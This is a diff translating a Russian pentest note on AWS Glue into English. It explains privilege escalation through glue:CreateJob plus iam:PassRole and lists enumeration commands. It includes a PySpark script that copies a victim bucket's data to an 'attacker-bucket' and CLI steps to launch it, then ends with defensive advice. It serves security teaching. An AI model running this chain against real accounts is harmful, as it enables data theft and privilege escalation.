@@ -1,64 +1,69 @@
 # Core
 
-**AWS Glue** — это полностью управляемый сервис для **ETL (Extract, Transform, Load)**:
+**AWS Glue** is a fully managed service for **ETL (Extract, Transform, Load)**:
 
-- **Extract** — извлекает данные из разных источников (S3, RDS, Redshift, JDBC и др.).
-- **Transform** — обрабатывает и очищает данные (например, через PySpark-скрипты).
-- **Load** — загружает данные в хранилище (например, в S3 или Redshift) для аналитики или Machine Learning.
+- **Extract** — pulls data from multiple sources (S3, RDS, Redshift, JDBC, etc.).
+- **Transform** — processes and cleans data (e.g., via PySpark scripts).
+- **Load** — loads data into storage (such as S3 or Redshift) for analytics or Machine Learning.
 
-**Сценарии использования:**
+**Common use cases:**
 
-- Подготовка данных для анализа (Athena, ML, Redshift).
-- Интеграция разных источников данных.
-- Каталогизация (через Glue Data Catalog — метаданные таблиц и баз данных).
-
----
-
-# 🛡 Glue в контексте AWS Pentest
-
-## 📍 Что может быть интересно с точки зрения атакующего:
-
-1. **Доступ к чувствительным данным**
-    - Glue часто взаимодействует с S3-бакетами, RDS, Redshift.
-    - Скрипты и пайплайны могут содержать **секреты, ключи, учетные данные**, hardcoded credentials.
-    - Например, можно получить скрипт в Glue Job с `aws_access_key_id` и `aws_secret_access_key`.
-2. **Privilege Escalation через роли**
-    - Glue jobs часто запускаются от **IAM роли**.
-    - Если ты можешь **редактировать или запускать Glue Job**, то ты можешь использовать роль, прикреплённую к Glue.
-    - Если у этой роли больше прав — 💥 privilege escalation.
-3. **Access Misconfiguration**
-    - Если пользователь имеет право на `glue:*`, это практически admin.
-    - Уязвимость возникает, если у тебя есть `glue:CreateJob` + `iam:PassRole`, даже с ограниченной ролью, ты можешь запускать произвольный код от имени роли с высокими привилегиями.
-4. **Кодовое выполнение**
-    - Glue job можно создать со своим скриптом на Python (PySpark).
-    - Если ты можешь запустить свой код → можешь эксфильтровать данные, выполнить бэкап, просканить сеть, залить шелл в S3 и т.д.
+- Preparing data for analytics (Athena, ML, Redshift).
+- Integrating multiple data sources.
+- Data cataloging (via **Glue Data Catalog** — table and database metadata).
 
 ---
 
-## 🔍 Что искать при пентесте:
+# 🛡 Glue in an AWS Pentest Context
 
-| Цель | Что искать | Почему важно |
+## 📍 What may be interesting from an attacker’s perspective:
+
+1. **Access to sensitive data**
+   - Glue often interacts with S3 buckets, RDS, and Redshift.
+   - Scripts and pipelines may contain **secrets, keys, or credentials**, including hardcoded values.
+   - For example, a Glue Job script may include `aws_access_key_id` and `aws_secret_access_key`.
+
+2. **Privilege escalation via IAM roles**
+   - Glue jobs typically run under an **IAM role**.
+   - If you can **edit or run a Glue Job**, you can leverage the role attached to it.
+   - If that role has broader permissions — 💥 privilege escalation.
+
+3. **Access misconfiguration**
+   - Having `glue:*` is effectively admin-level access.
+   - A common issue is having `glue:CreateJob` + `iam:PassRole`; even with a restricted role, this allows running arbitrary code under a higher-privileged role.
+
+4. **Code execution**
+   - Glue jobs can be created with custom Python (PySpark) scripts.
+   - If you can run your own code → you can exfiltrate data, perform backups, scan the network, upload shells to S3, etc.
+
+---
+
+## 🔍 What to Look for During a Pentest:
+
+| Target | What to Check | Why It Matters |
 | --- | --- | --- |
-| **Glue Jobs** | `aws glue get-jobs`, `aws glue get-job --name your-job` | Получить скрипт, обнаружить секреты |
-| **Data Catalog** | `aws glue get-databases`, `aws glue get-tables` | Видно, какие базы и таблицы есть |
-| **Permissions** | `iam list-policies`, `glue:CreateJob`, `glue:StartJobRun`, `iam:PassRole` | Возможность привилегий и запуска кода |
-| **Connections** | `aws glue get-connections` | JDBC-ссылки, можно найти creds к БД |
+| **Glue Jobs** | `aws glue get-jobs`, `aws glue get-job --name your-job` | Retrieve scripts, discover secrets |
+| **Data Catalog** | `aws glue get-databases`, `aws glue get-tables` | Visibility into existing databases and tables |
+| **Permissions** | `iam list-policies`, `glue:CreateJob`, `glue:StartJobRun`, `iam:PassRole` | Privilege escalation and code execution paths |
+| **Connections** | `aws glue get-connections` | JDBC endpoints; may reveal DB credentials |
 
-# Пример атаки через Glue Job
+---
 
-## 📌 Предпосылки:
+# Example Attack via a Glue Job
 
-Ты **уже скомпрометировал IAM-пользователя**, у которого есть такие права:
+## 📌 Preconditions:
+
+You have **already compromised an IAM user** with the following permissions:
 
 - `glue:CreateJob`
 - `glue:StartJobRun`
-- `iam:PassRole` (на Glue Service Role, с доступом к интересному S3-бакету)
+- `iam:PassRole` (on a Glue service role with access to a target S3 bucket)
 
 ---
 
-### 🧪 Шаг 1: Пишем PySpark скрипт
+### 🧪 Step 1: Write a PySpark Script
 
-Пример скрипта, который читает из S3 и отправляет содержимое тебе (или просто пишет в другой бакет):
+Example script that reads data from S3 and sends it to you (or writes it to another bucket):
 
 ```python
 import boto3
@@ -68,22 +73,22 @@ def upload_data():
     bucket = 'target-victim-bucket'
     key = 'secret-data.txt'
 
-    # читаем файл (или список файлов)
+    # Read file (or list of files)
     obj = s3.get_object(Bucket=bucket, Key=key)
     data = obj['Body'].read().decode('utf-8')
 
-    # отправляем себе — например, в твой собственный бакет
+    # Exfiltrate data — e.g., to your own bucket
     s3.put_object(Bucket='attacker-bucket', Key='loot.txt', Body=data)
 
 upload_data()
 ```
 
-> 🔐 Ты можешь также просто загрузить всё содержимое бакета, если используешь list_objects_v2.
+> 🔐 You could also download the entire bucket if you use `list_objects_v2`.
 > 
 
 ---
 
-### 🛠 Шаг 2: Создаёшь Glue Job
+### 🛠 Step 2: Create the Glue Job
 
 ```bash
 aws glue create-job \
@@ -93,23 +98,24 @@ aws glue create-job \
   --region your-region
 ```
 
-👉 Тебе надо заранее загрузить скрипт `evil_script.py` в **твой S3**.
+> 👉 Make sure to upload `evil_script.py` to your S3 bucket beforehand.
 
 ---
 
-### 🚀 Шаг 3: Запускаешь Job
+### 🚀 Step 3: Start the Job
 
 ```bash
 aws glue start-job-run --job-name evil-job
 ```
 
-Если всё прокатило — скрипт выполнится от имени **той роли**, которую ты передал в `--role`, а не от твоего пользователя. Это и есть **Privilege Escalation** + **Data Exfiltration**.
+If successful, the script executes under the role passed via --role, not your compromised user.
+This results in Privilege Escalation + Data Exfiltration.
 
 ---
 
-## 🔐 Как защититься (если вдруг ты по другую сторону):
+## 🔐 Defensive Notes (Blue Team):
 
-- Никогда не давать `iam:PassRole` без ограничений
-- Всегда проверять, какие роли может использовать Glue
-- Мониторить скрипты и запуск Job-ов (CloudTrail)
-- Изолировать важные S3-бакеты на уровне bucket policy
+- Never grant unrestricted iam:PassRole
+- Always restrict which roles Glue can assume
+- Monitor Glue Job scripts and executions (CloudTrail)
+- Isolate sensitive S3 buckets via bucket policies
